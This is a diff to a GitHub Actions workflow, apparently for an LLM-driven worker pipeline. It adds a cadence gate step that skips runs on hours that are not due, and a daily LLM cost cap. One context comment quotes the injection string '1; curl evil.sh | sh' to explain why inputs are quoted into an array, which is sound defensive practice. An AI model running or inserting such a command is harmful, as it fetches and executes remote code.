@@ -19,6 +19,10 @@ on:
         description: 'Blank for the full run, or "launches"'
         type: string
         default: ''
+      cadence_gate:
+        description: 'Ask `cli.ts cadence` first and skip the run when this hour is not due'
+        type: boolean
+        default: false
       dry_run:
         type: boolean
         default: false
@@ -59,7 +63,20 @@ jobs:
       - name: Install dependencies
         run: bun install --frozen-lockfile
 
+      # Reads stored runs only. A skipped hour costs the install above and
+      # nothing else: no run row, no LLM call, no alert.
+      - name: Cadence gate
+        id: cadence
+        if: inputs.cadence_gate
+        run: bun run apps/worker/src/cli.ts cadence
+        env:
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+          DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
+          CADENCE_MODE: ${{ vars.CADENCE_MODE }}
+          LLM_MAX_COST_USD_PER_DAY: ${{ vars.LLM_MAX_COST_USD_PER_DAY }}
+
       - name: Migrate database
+        if: steps.cadence.outputs.due != 'false'
         run: bun run apps/worker/src/cli.ts migrate
         env:
           DATABASE_URL: ${{ secrets.DATABASE_URL }}
@@ -70,6 +87,7 @@ jobs:
       # `1; curl evil.sh | sh` would have been pasted in as a command. They are
       # also quoted into an array rather than word-split out of one string.
       - name: Run pipeline
+        if: steps.cadence.outputs.due != 'false'
         run: |
           set -o pipefail
           args=(run)
@@ -103,6 +121,8 @@ jobs:
           # The launch lane runs every 30 minutes, so it can carry its own
           # ceiling; blank falls back to the shared one.
           LLM_MAX_COST_USD_PER_RUN: ${{ inputs.lane == 'launches' && vars.LAUNCHES_MAX_COST_USD_PER_RUN || vars.LLM_MAX_COST_USD_PER_RUN }}
+          # Shared by both lanes across the trailing 24 h; blank or 0 = off.
+          LLM_MAX_COST_USD_PER_DAY: ${{ vars.LLM_MAX_COST_USD_PER_DAY }}
           LLM_MAX_WEB_SEARCHES: ${{ vars.LLM_MAX_WEB_SEARCHES }}
           LLM_SEARCH_BACKEND: ${{ vars.LLM_SEARCH_BACKEND }}
           # Chain data. RPC lists are comma-separated, tried in order; blank
@@ -148,7 +168,7 @@ jobs:
 
       # Uploaded even on failure: a failed run's log is the only record of why.
       - name: Upload run artifacts
-        if: always()
+        if: always() && steps.cadence.outputs.due != 'false'
         uses: actions/upload-artifact@v4
         with:
           name: ${{ inputs.artifact_prefix }}-${{ github.run_id }}
